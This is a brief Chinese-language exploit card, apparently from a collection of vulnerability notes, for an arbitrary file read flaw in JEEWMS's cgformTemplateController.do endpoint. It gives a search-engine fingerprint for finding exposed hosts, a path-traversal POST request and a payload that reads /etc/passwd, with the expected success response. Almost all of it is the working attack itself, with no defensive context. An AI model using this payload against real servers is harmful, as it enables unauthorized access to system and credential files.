# JeewmscgformTemplatecontroller.do任意文件读取漏洞

JeewmscgformTemplatecontroller ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="url:userController.do?userOrgSelect&userId="`
- **请求**：`POST /rest/../cgformTemplateController.do?showPic HTTP/1.1`

**Payload**
```
code=default&path=../../../../../../../../../../etc/passwd
```
- **响应特征**：200